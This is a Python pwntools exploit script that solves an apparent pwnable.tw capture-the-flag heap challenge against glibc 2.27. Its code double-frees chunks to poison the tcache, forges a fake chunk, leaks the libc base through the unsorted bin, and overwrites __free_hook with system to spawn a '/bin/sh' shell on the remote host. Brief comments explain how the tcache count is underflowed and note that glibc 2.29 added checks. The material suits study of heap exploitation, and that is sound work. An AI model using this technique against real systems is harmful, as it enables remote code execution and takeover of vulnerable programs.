###tcache in libc 2.27

from pwn import *

def create(size,data):
    r.sendlineafter('choice :','1')
    r.sendlineafter('Size:',str(size))
    r.sendafter('Data:',data)

def delete():
    r.sendlineafter('choice :','2')

def info():
    r.sendlineafter('choice :','3')
    res = r.recvuntil('$$$$$$$$')[6:-8]
    return res

###Useful addr
#  libc2.27
main_arena_offset = 0x3ebc40
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x3ed8e8
system_offset = 0x4f440

###Exploit
r = remote('chall.pwnable.tw',10207)
r.sendafter('Name','M30W')

###create fake chunk on name buffer
create(0xf8,'a')
delete()
delete()
create(0xf8,p64(0x602060))
create(0xf8,'b')
create(0xf8,p64(0)+p64(0x91)+p64(0)*17+p64(0x21)+p64(0)*3+p64(21))    #craft two addtiona block to bypass free checks

###trigger free to unsorted bin
###on malloc, as long as fb!=NULL, even if bin_cnt==0, we will still take block from tcache
###the next free will see a bin_cnt of -1, which makes it believe the bin is full
###thus new blocks will be freed to the original destination
create(0x88,'a')
delete()
delete()
create(0x88,p64(0x602070))  #align to the 0x91 block we crafted earlier
create(0x88,'b')
create(0x88,'b')    #make an additional malloc
delete()            #free to unsorted bin
unsorted_bin_addr = u64(info()[16:24])
libc_base = unsorted_bin_addr-unsorted_bin_offset

###overwrite free_hook to system
create(0xe8,'a')
delete()
delete()
create(0xe8,p64(libc_base+free_hook_offset-0x8))
create(0xe8,'b')
create(0xe8,b'/bin/sh\x00'+p64(libc_base+system_offset))

###get shell
delete()
r.interactive()



###Additional note
###tcache has a 64 bins and max size of 0x410, blocks outside this range would never be placed in tcache
###new tcache corruption checking mechanism has been introduced in glibc2.29
